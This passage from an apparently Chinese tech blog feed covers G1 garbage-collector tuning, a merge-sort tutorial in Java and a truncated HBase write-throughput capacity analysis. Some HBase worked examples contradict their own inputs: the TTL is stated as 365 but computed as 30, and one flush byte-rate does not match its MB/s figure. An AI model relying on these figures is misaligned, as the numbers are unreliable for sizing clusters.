src="http://jbcdn2.b0.upaiyun.com/2016/12/0860c63775ccbc265095b5a844f0d381.png" alt="12"></a></p><p>混合式GC也是采用的复制的清理策略，当GC完成后，会重新释放空间。</p><p><a href="http://jbcdn2.b0.upaiyun.com/2016/12/599b50c478126754a1cc614a85b149bd.png" target="_blank" rel="noopener"><img src="http://jbcdn2.b0.upaiyun.com/2016/12/599b50c478126754a1cc614a85b149bd.png" alt="13"></a></p><p>至此，混合式GC告一段落了。下一小节我们讲进入调优实践。</p><h2 id="五-调优实践"><a href="#五-调优实践" class="headerlink" title="五 调优实践"></a><strong>五 调优实践</strong></h2><p>MaxGCPauseMillis调优</p><p>前面介绍过使用GC的最基本的参数：</p><blockquote><p>-XX:+UseG1GC -Xmx32g -XX:MaxGCPauseMillis=200</p></blockquote><p>前面2个参数都好理解，后面这个MaxGCPauseMillis参数该怎么配置呢？这个参数从字面的意思上看，就是允许的GC最大的暂停时间。G1尽量确保每次GC暂停的时间都在设置的MaxGCPauseMillis范围内。 那G1是如何做到最大暂停时间的呢？这涉及到另一个概念，CSet(collection set)。它的意思是在一次垃圾收集器中被收集的区域集合。</p><ul><li>Young GC：选定所有新生代里的region。通过控制新生代的region个数来控制young GC的开销。</li><li>Mixed GC：选定所有新生代里的region，外加根据global concurrent marking统计得出收集收益高的若干老年代region。在用户指定的开销目标范围内尽可能选择收益高的老年代region。</li></ul><p>在理解了这些后，我们再设置最大暂停时间就好办了。 首先，我们能容忍的最大暂停时间是有一个限度的，我们需要在这个限度范围内设置。但是应该设置的值是多少呢？我们需要在吞吐量跟MaxGCPauseMillis之间做一个平衡。如果MaxGCPauseMillis设置的过小，那么GC就会频繁，吞吐量就会下降。如果MaxGCPauseMillis设置的过大，应用程序暂停时间就会变长。G1的默认暂停时间是200毫秒，我们可以从这里入手，调整合适的时间。</p><h3 id="其他调优参数"><a href="#其他调优参数" class="headerlink" title="其他调优参数"></a><strong>其他调优参数</strong></h3><p>-XX:G1HeapRegionSize=n</p><p>设置的 G1 区域的大小。值是 2 的幂，范围是 1 MB 到 32 MB 之间。目标是根据最小的 Java 堆大小划分出约 2048 个区域。</p><p>-XX:ParallelGCThreads=n</p><p>设置 STW 工作线程数的值。将 n 的值设置为逻辑处理器的数量。n 的值与逻辑处理器的数量相同，最多为 8。</p><p>如果逻辑处理器不止八个，则将 n 的值设置为逻辑处理器数的 5/8 左右。这适用于大多数情况，除非是较大的 SPARC 系统，其中 n 的值可以是逻辑处理器数的 5/16 左右。</p><p>-XX:ConcGCThreads=n</p><p>设置并行标记的线程数。将 n 设置为并行垃圾回收线程数 (ParallelGCThreads) 的 1/4 左右。</p><p>-XX:InitiatingHeapOccupancyPercent=45</p><p>设置触发标记周期的 Java 堆占用率阈值。默认占用率是整个 Java 堆的 45%。</p><p>避免使用以下参数：</p><p>避免使用 -Xmn 选项或 -XX:NewRatio 等其他相关选项显式设置年轻代大小。固定年轻代的大小会覆盖暂停时间目标。</p><h3 id="触发Full-GC"><a href="#触发Full-GC" class="headerlink" title="触发Full GC"></a><strong>触发Full GC</strong></h3><p>在某些情况下，G1触发了Full GC，这时G1会退化使用Serial收集器来完成垃圾的清理工作，它仅仅使用单线程来完成GC工作，GC暂停时间将达到秒级别的。整个应用处于假死状态，不能处理任何请求，我们的程序当然不希望看到这些。那么发生Full GC的情况有哪些呢？</p><ul><li>并发模式失败</li></ul><p>G1启动标记周期，但在Mix GC之前，老年代就被填满，这时候G1会放弃标记周期。这种情形下，需要增加堆大小，或者调整周期（例如增加线程数-XX:ConcGCThreads等）。</p><ul><li>晋升失败或者疏散失败</li></ul><p>G1在进行GC的时候没有足够的内存供存活对象或晋升对象使用，由此触发了Full GC。可以在日志中看到(to-space exhausted)或者（to-space overflow）。解决这种问题的方式是：</p><p>a,增加 -XX:G1ReservePercent 选项的值（并相应增加总的堆大小），为“目标空间”增加预留内存量。</p><p>b,通过减少 -XX:InitiatingHeapOccupancyPercent 提前启动标记周期。</p><p>c,也可以通过增加 -XX:ConcGCThreads 选项的值来增加并行标记线程的数目。</p><ul><li>巨型对象分配失败</li></ul><p>当巨型对象找不到合适的空间进行分配时，就会启动Full GC，来释放空间。这种情况下，应该避免分配大量的巨型对象，增加内存或者增大-XX:G1HeapRegionSize，使巨型对象不再是巨型对象。</p><p>由于篇幅有限，G1还有很多调优实践，在此就不一一列出了，大家在平常的实践中可以慢慢探索。最后，期待java 9能正式发布，默认使用G1为垃圾收集器的java性能会不会又提高呢？</p><p>附录：</p><p>（1）<a href="http://dl.acm.org/citation.cfm?id=1029879" target="_blank" rel="noopener">The original G1 paper: Detlefs, D., Flood, C., Heller, S., and Printezis, T. 2004. Garbage-first garbage collection. In Proceedings of the 4th international Symposium on Memory Management (Vancouver, BC, Canada, October 24 – 25, 2004)</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java虚拟机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>归并排序</title>
      <link href="/2019/01/16/suan-fa/pai-xu/gui-bing-pai-xu/"/>
      <url>/2019/01/16/suan-fa/pai-xu/gui-bing-pai-xu/</url>
      
        <content type="html"><![CDATA[<h2 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h2><h1 id="基本思想"><a href="#基本思想" class="headerlink" title="基本思想"></a>基本思想</h1><p>　　归并排序（MERGE-SORT）是利用<strong>归并</strong>的思想实现的排序方法，该算法采用经典的<strong>分治</strong>（divide-and-conquer）策略（分治法将问题<strong>分</strong>(divide)成一些小的问题然后递归求解，而<strong>治(conquer)</strong>的阶段则将分的阶段得到的各答案”修补”在一起，即分而治之)。</p><p><strong>分而治之</strong></p><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/排序算法/1024555-20161218163120151-452283750.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/排序算法/1024555-20161218163120151-452283750.png" alt="img"></a></p><p> 　　可以看到这种结构很像一棵完全二叉树，本文的归并排序我们采用递归去实现（也可采用迭代的方式去实现）。<strong>分</strong>阶段可以理解为就是递归拆分子序列的过程，递归深度为log2n。</p><h1 id="合并相邻有序子序列"><a href="#合并相邻有序子序列" class="headerlink" title="合并相邻有序子序列"></a>合并相邻有序子序列</h1><p>　　再来看看<strong>治</strong>阶段，我们需要将两个已经有序的子序列合并成一个有序序列，比如上图中的最后一次合并，要将[4,5,7,8]和[1,2,3,6]两个已经有序的子序列，合并为最终序列[1,2,3,4,5,6,7,8]，来看下实现步骤。</p><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/排序算法/1024555-20161218194508761-468169540.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/排序算法/1024555-20161218194508761-468169540.png" alt="img"></a></p><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/排序算法/1024555-20161218194621308-588010220.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/排序算法/1024555-20161218194621308-588010220.png" alt="img"></a></p><h1 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h1><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> sortdemo<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Arrays<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * Created by chengxiao on 2016/12/8. */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MergeSort</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String <span class="token punctuation">[</span><span class="token punctuation">]</span>args<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">int</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>arr <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token function">sort</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>Arrays<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">sort</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>arr<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">int</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>temp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//在排序前，先建好一个长度等于原数组长度的临时数组，避免递归中频繁开辟空间</span>        <span class="token function">sort</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>arr<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>temp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">sort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span><span class="token keyword">int</span> left<span class="token punctuation">,</span><span class="token keyword">int</span> right<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>temp<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>left<span class="token operator">&lt;</span>right<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token punctuation">(</span>left<span class="token operator">+</span>right<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>            <span class="token function">sort</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span>left<span class="token punctuation">,</span>mid<span class="token punctuation">,</span>temp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//左边归并排序，使得左子序列有序</span>            <span class="token function">sort</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span>mid<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>right<span class="token punctuation">,</span>temp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//右边归并排序，使得右子序列有序</span>            <span class="token function">merge</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span>left<span class="token punctuation">,</span>mid<span class="token punctuation">,</span>right<span class="token punctuation">,</span>temp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将两个有序子数组合并操作</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span><span class="token keyword">int</span> left<span class="token punctuation">,</span><span class="token keyword">int</span> mid<span class="token punctuation">,</span><span class="token keyword">int</span> right<span class="token punctuation">,</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> temp<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">int</span> i <span class="token operator">=</span> left<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//左序列指针</span>        <span class="token keyword">int</span> j <span class="token operator">=</span> mid<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//右序列指针</span>        <span class="token keyword">int</span> t <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//临时数组指针</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>i<span class="token operator">&lt;=</span>mid <span class="token operator">&amp;&amp;</span> j<span class="token operator">&lt;=</span>right<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;=</span>arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                temp<span class="token punctuation">[</span>t<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>                temp<span class="token punctuation">[</span>t<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">&lt;=</span>mid<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//将左边剩余元素填充进temp中</span>            temp<span class="token punctuation">[</span>t<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>j<span class="token operator">&lt;=</span>right<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//将右序列剩余元素填充进temp中</span>            temp<span class="token punctuation">[</span>t<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        t <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//将temp中的元素全部拷贝到原数组中</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>left <span class="token operator">&lt;=</span> right<span class="token punctuation">)</span><span class="token punctuation">{</span>            arr<span class="token punctuation">[</span>left<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">[</span>t<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>执行结果</p><pre><code>[1, 2, 3, 4, 5, 6, 7, 8, 9]</code></pre><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>　　归并排序是稳定排序，它也是一种十分高效的排序，能利用完全二叉树特性的排序一般性能都不会太差。java中Arrays.sort()采用了一种名为TimSort的排序算法，就是归并排序的优化版本。从上文的图中可看出，每次合并操作的平均时间复杂度为O(n)，而完全二叉树的深度为|log2n|。总的平均时间复杂度为O(nlogn)。而且，归并排序的最好，最坏，平均时间复杂度均为O(nlogn)。</p><p>本文转载自：<a href="https://www.cnblogs.com/chengxiao/p/6194356.html" target="_blank" rel="noopener">原文</a></p>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 排序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HBase写吞吐场景资源消耗量化分析及优化</title>
      <link href="/2019/01/16/hbase/hbase-xie-tun-tu-chang-jing-zi-yuan-xiao-hao-liang-hua-fen-xi-ji-you-hua/"/>
      <url>/2019/01/16/hbase/hbase-xie-tun-tu-chang-jing-zi-yuan-xiao-hao-liang-hua-fen-xi-ji-you-hua/</url>
      
        <content type="html"><![CDATA[<h1 id="HBase写吞吐场景资源消耗量化分析及优化"><a href="#HBase写吞吐场景资源消耗量化分析及优化" class="headerlink" title="HBase写吞吐场景资源消耗量化分析及优化"></a>HBase写吞吐场景资源消耗量化分析及优化</h1><h1 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h1><p>HBase 是一个基于 Google BigTable 论文设计的高可靠性、高性能、可伸缩的分布式存储系统。 网上关于 HBase 的文章很多，官方文档介绍的也比较详细，本篇文章不介绍 HBase 基本的细节。</p><p>本文从 HBase 写链路开始分析，然后针对少量随机读和海量随机写入场景入手，全方面量化分析各种资源的开销, 从而做到以下两点：</p><ol><li>在给定业务量级的情况下，预先评估好集群的合理规模</li><li>在 HBase 的众多参数中，选择合理的配置组合</li></ol><h1 id="二、HBase-写链路简要分析"><a href="#二、HBase-写链路简要分析" class="headerlink" title="二、HBase 写链路简要分析"></a>二、HBase 写链路简要分析</h1><p>HBase 的写入链路基于 LSM（Log-Structured Merge-Tree), 基本思想是把用户的随机写入转化为两部分写入：</p><p>Memstore 内存中的 Map, 保存随机的随机写入，待 memstore 达到一定量的时候会异步执行 flush 操作，在 HDFS 中生成 HFile 中。 同时会按照写入顺序，把数据写入一份到 HDFS 的 WAL（Write Ahead Log）中，用来保证数据的可靠性，即在异常（宕机，进程异常退出）的场景下，能够恢复 Memstore 中还没来得及持久化成 HFile 的数据。</p><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/Hbase/201901161705.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/Hbase/201901161705.png" alt="img"></a></p><h1 id="三、Flush-amp-Compaction"><a href="#三、Flush-amp-Compaction" class="headerlink" title="三、Flush &amp; Compaction"></a>三、Flush &amp; Compaction</h1><p>上一节中，介绍了 HBase 的写路径，其中 HFile 是 HBase 数据持久化的最终形态, 本节将介绍 HBase 如何生成 HFile 和管理 HFile。关于 HFile， 主要涉及到两个核心操作：</p><ol><li>Flushing</li><li>Compaction</li></ol><p>上一节中提到，HBase 的写入最先会放入内存中，提供实时的查询，当 Memstore 中数据达到一定量的阈值（128MB），会通过 Flush 操作生成 HFile 持久化到 HDFS 中，随着用户的写入，生成的 HFile 数目会逐步增多，这会影响用户的读操作，同时也会系统占用（HDFS 层 block 的数目， regionserver 服务器的文件描述符占用）， region split 操作，region reopen 操作也会受到不同程度影响。 </p><p>HBase 通过 Compaction 机制将多个 HFile 合并成一个 HFile 以控制每个 Region 内的 HFile 的数目在一定范围内， 当然 Compaction 还有其他的作用，比如数据本地化率，多版本数据的合并，数据删除标记的清理等等，本文不做展开。</p><p>另外还有一点需要知道的是，HBase 中 Flush 操作和 Compaction 操作和读写链路是由独立线程完成的，互不干扰。</p><h1 id="四、系统开销定量分析"><a href="#四、系统开销定量分析" class="headerlink" title="四、系统开销定量分析"></a>四、系统开销定量分析</h1><p>为了简化计算，本节针对事件类数据写吞吐型场景，对 HBase 系统中的开销做定量的分析，做以下假设：</p><ol><li>数据写入的 Rowkey 是打散的，不存在写热点</li><li>数据写入量及总量是可评估的，会对数据做预先分区，定量分析基于 region 分布稳定的情况下</li><li>假设随机读的数目很小，小到可以忽略 IO 开销，且对读 RT 不敏感</li><li>数据没有多版本，没有删除操作，compaction 不会减少数据量</li><li>HBase 写入链路中不存在随机磁盘，所以随机 IOPS 不会成为瓶颈</li><li>一般大数据机型的多个 SATA 盘的顺序写吞吐大于万兆网卡</li><li>忽略掉 RPC 带来的额外的带宽消耗</li></ol><h2 id="4-1-系统变量"><a href="#4-1-系统变量" class="headerlink" title="4.1 系统变量"></a>4.1 系统变量</h2><ol><li>单条数据大小 -&gt; s （bytes）</li><li>峰值写 TPS -&gt; T</li><li>HFile 副本数→ R1 （一般为3）</li><li>WAL 副本数 → R2 (一般为3)</li><li>WAL 数据压缩比 → Cwal (一般是1)</li><li>HFile 压缩比 → C (采用 DIFF + LZO， 日志场景压缩比一般为 0.2左右)</li><li>FlushSize → F (这里跟 regionserver 的 memstore 内存容量，region 数目，写入是否平均和 flushsize 的配置有关，简化分析，认为内存是足够的 128MB)</li><li>hbase.hstore.compaction.min → CT （默认是 3， 一般情况下，决定了归并系数，即每次 9. compaction 参与的文件数目，在不存在 compaction 积压的情况下， 实际运行时也是在 3 左右）</li><li>数据生命周期 → TTL (决定数据量的大小，一般写吞吐场景，日志会有一定的保存周期, 单位天)</li><li>单机数据量水位 → D ( 单位 T，这里指 HDFS 上存放 HFile 数据的数据量平均分担到每台机器上)</li><li>MajorCompaction 周期 → M( hbase.hregion.majorcompaction 决定，默认 20 天)</li></ol><p>以上 11 个参数，是本次量化分析中需要使用到的变量，系统资源方面主要量化以下两个指标：</p><ol><li>磁盘开销</li><li>网络开销</li></ol><h2 id="4-2-磁盘容量开销量化分析"><a href="#4-2-磁盘容量开销量化分析" class="headerlink" title="4.2 磁盘容量开销量化分析"></a>4.2 磁盘容量开销量化分析</h2><p>这里只考虑磁盘空间方面的占用，相关的变量有：</p><ol><li>单条数据大小 s</li><li>峰值写入 TPS</li><li>HFile 副本数 R1</li><li>HFile 压缩比 c</li><li>数据生命周期 TTL</li></ol><p>HFile 的磁盘容量量化公式</p><blockquote><p>V = TTL <em> 86400 </em> T <em> s </em> C * R1</p></blockquote><p>假设 s = 1000, TTL = 365， T = 200000, C = 0.2 , R1 = 3 的情况下，HFile 磁盘空间需求是：</p><pre><code>  V = 30 * 86400 * 200000 * 1000 * 0.2 * 3      = 311040000000000.0 bytes    = 282T </code></pre><p>在这里我们忽略了其他占用比较小的磁盘开销，比如：</p><ol><li>WAL 的磁盘开销，在没有 Replication，写入平均的情况下，WAL 的日志量约定于 (hbase.master.logcleaner.ttl /1000) <em> s </em> TPS + totalMemstoreSize</li><li>Compaction 临时文件，Split 父 Region 文件等临时文件</li><li>Snapshot 文件</li><li>等等</li></ol><h2 id="4-3-网络开销量化分析"><a href="#4-3-网络开销量化分析" class="headerlink" title="4.3 网络开销量化分析"></a>4.3 网络开销量化分析</h2><p>HBase 中会造成巨大网络开销的主要由一下三部分组成，他们是相互独立，异步进行的，这里做个比方，HBase 这三个操作和人吃饭很像，这里做个类比</p><table><thead><tr><th>HBase</th><th>人类</th></tr></thead><tbody><tr><td>写路径</td><td>咀嚼</td></tr><tr><td>Flush</td><td>吞咽</td></tr><tr><td>Compaction</td><td>消化</td></tr><tr><td>Compaction积压</td><td>销毁不良</td></tr></tbody></table><p>回归正题，下面按照发生顺序，从三个角度分别分析：</p><ol><li>写路径</li><li>Flush</li><li>Compaction</li></ol><h3 id="4-3-1-写路径"><a href="#4-3-1-写路径" class="headerlink" title="4.3.1 写路径"></a>4.3.1 写路径</h3><p>写路径的网络开销，主要是写 WAL 日志方面, 相关的变量有：</p><ol><li>单条数据大小 s</li><li>峰值写入 TPS</li><li>WAL 副本数 R2</li><li>WAL 压缩比 Cwal</li></ol><p>写路径中，产生的网络流量分为两部分，一部分是写 WAL 产生的流量，一部分是外部用户 RPC 写入的流量， In 流量和 Out 流量计算公式为：</p><blockquote><p>NInWrite = T <em> s </em> Cwal <em> (R2 - 1) + （T </em> s )</p><p>NOutWrite = T <em> s </em> Cwal * (R2 - 1)</p></blockquote><p>假设 T = 20W，s = 1000, Cwal = 1.0, R2 = 3</p><pre><code>      NInwrite = 200000 * 1000  * 1 * (3-1) + 200000 * 1000               = 600000000 bytes/s               = 572MB/s     NOutwrite = 200000 * 1000* 1 * (3-1)               = 400000000 bytes/s               = 381MB/s</code></pre><h3 id="4-3-2-Flush"><a href="#4-3-2-Flush" class="headerlink" title="4.3.2 Flush"></a>4.3.2 Flush</h3><p>Flush 的网络开销，主要是生成 HFile 后，将 HFile 写入到 HDFS 的过程，相关的变量有：</p><ol><li>单条数据大小 s</li><li>峰值写入 T</li><li>HFIle 副本数 R1</li><li>HFile 压缩比 C</li></ol><p>Flush 产生的 In 流量和 Out 流量计算公式为：</p><blockquote><p>NInWrite = s <em> T </em> (R1 - 1) * C</p><p>NOutWrite = s <em> T </em> (R1 - 1) * C</p></blockquote><p>假设 T = 20W， S = 1000， R1 = 3， C = 0.2</p><pre><code>  NInwrite  = 200000 * 1000 * (3 - 1) * 0.2             = 80000000.0 bytes/s            =76.3MB/s NOutwrite  = 200000 * 1000 * (3 - 1) * 0.2             = 120000000.0 bytes/s            =76.3MB/s</code></pre><h3 id="4-3-3-Compaction"><a href="#4-3-3-Compaction" class="headerlink" title="4.3.3 Compaction"></a>4.3.3 Compaction</h3><p>Compaction 比较复杂，在有预分区不考虑 Split 的情况下分为两类：</p><ol><li>Major Compaction</li><li>Minor Compaction</li></ol><p>两者是独立的，下面将分别针对两种 Compaction 做分析，最后取和。</p><h4 id="4-3-3-1-Major-Compaction"><a href="#4-3-3-1-Major-Compaction" class="headerlink" title="4.3.3.1 Major Compaction"></a>4.3.3.1 Major Compaction</h4><p>Major Compaction 的定义是由全部 HFile 参与的 Compaction， 一般在发生在 Split 后发生，或者到达系统的 MajorCompaction 周期， 默认的 MajorCompaction 周期为 20 天，这里我们暂时忽略 Split 造成的 MajorCompaction 流量. 最终 Major Compaction 开销相关的变量是:</p><ol><li>单机数据量水位 D</li><li>HFIle 副本数 R1</li><li>MajorCompaction 周期 → M (默认 20 天)</li></ol><p>这里假设数据是有本地化的，所以 MajorCompaction 的读过程，走 ShortCircuit，不计算网络开销，并且写 HFile 的第一副本是本地流量，也不做流量计算，所以 MajorCompaction 的网络流量计算公式是：</p><blockquote><p>NInMajor = D * (R1 - 1) / M</p><p>NOutMajor = D * (R1 - 1) / M</p></blockquote><p>假设 D = 10T, R1 = 3, M = 20</p><pre><code>    NInMajor =  10 * 1024 * 1024 * 1024 * 1024 * (3 - 1) / (20 * 86400)             = 12725829bytes/s              = 12MB/s   NOutMajor =  10 * 1024 * 1024 * 1024 * 1024 * (3 - 1) / (20 * 86400)             = 12725829bytes /s              = 12MB/s</code></pre><h4 id="4-3-3-2-Minor-Compaction"><a href="#4-3-3-2-Minor-Compaction" class="headerlink" title="4.3.3.2 Minor Compaction"></a>4.3.3.2 Minor Compaction</h4><p>量化之前，先问一个问题，每条数据在第一次 flush 成为 HFile 之后，会经过多少次 Minor Compaction?</p><p>要回答这个问题之前，要先了解现在 HBase 默认的 compaction 的文件选取策略，这里不展开，只做简单分析，MinorCompaction 选择的文件对象数目，一般处于 hbase.hstore.compaction.min（默认 3）和 hbase.hstore.compaction.max（默认 10）之间, 总文件大小小于 hbase.hstore.compaction.max.size（默认 Max）， 如果文件的 Size 小于 hbase.hstore.compaction.min.size（默认是 flushsize）， 则一定会被选中； 并且被选中的文件 size 的差距不会过大, 这个由参数 hbase.hstore.compaction.ratio 和 hbase.hstore.compaction.ratio.offpeak 控制，这里不做展开。</p><p>所以，在 Compaction 没有积压的情况下，每次 compaction 选中的文件数目会等于 hbase.hstore.compaction.min 并且文件 size 应该相同量级， 对稳定的表，对每条数据来说，经过的 compaction 次数越多，其文件会越大. 其中每条数据参与 Minor Compaction 的最大次数可以用公式 math.log( 32000 / 25.6, 3) = 6 得到</p><p>这里用到的两个变量是：</p><ol><li>FlushSize 默认是 128 MB</li><li>HFile 压缩比例，假设是 0.2</li></ol><p>所以刚刚 Flush 生成的 HFile 的大小在 25.6MB 左右，当集齐三个 25.6MB 的 HFile 后，会触发第一次 Minor Compaction， 生成一个 76.8MB 左右的 HFile。</p><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/Hbase/201901161709.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/Hbase/201901161709.png" alt="img"></a></p><p>对于一般情况，单个 Region 的文件 Size 我们会根据容量预分区好，并且控制单个 Region 的 HFile 的总大小 在 32G 以内，对于一个 Memstore 128MB, HFile 压缩比 0.2， 单个 Region 32G 的表，上表中各个 Size 的 HFile 数目不会超过 2 个(否则就满足了触发 Minor Compaction 的条件)。</p><p>32G = 18.6G + 6.2G + 6.2G + 690MB + 230MB + 76.8MB + 76.8MB</p><p>到这里，我们知道每条写入的数据，从写入到 TTL 过期，经过 Minor Compaction 的次数是可以计算出来的。所以只要计算出每次 Compaction 的网络开销，就可以计算出，HBase 通过次要压缩消化每条数据，所占用的总的开销是多少，这里用到的变量有：</p><ol><li>单条数据大小s</li><li>峰值写入T.</li><li>HFIle副本数R1</li><li>HFile压缩比C</li></ol><p>计算公式如下：</p><blockquote><p>NInMinor = S <em> T </em>（R1-1）<em> C </em>总次数</p><p>NOutMinor = S <em> T </em>（R1-1）<em> C </em>总次数</p></blockquote><p>假设S = 1000，T = 20W，R1 = 3，C = 0.2，总次数= 6</p><pre><code>    NInminor = 1000 * 200000 * (3 - 1) * 0.2 * 6             = 480000000.0bytes/s             = 457.8MB/s    NOutminor = 1000 * 200000 * (3 - 1) * 0.2 * 6             = 480000000.0bytes/s             = 457.8MB/s </code></pre><h3 id="4-3-4-网络资源定量分析小结"><a href="#4-3-4-网络资源定量分析小结" class="headerlink" title="4.3.4 网络资源定量分析小结"></a>4.3.4 网络资源定量分析小结</h3><p>在用户写入 TPS 20W，单条数据大小 1000 bytes 的场景下，整体网络吞吐为：</p><pre><code>NIntotal   = NInwrite + NInflush + NInmajor + NInminor           = 572MB/s + 76.3MB/s  + 12MB/s + 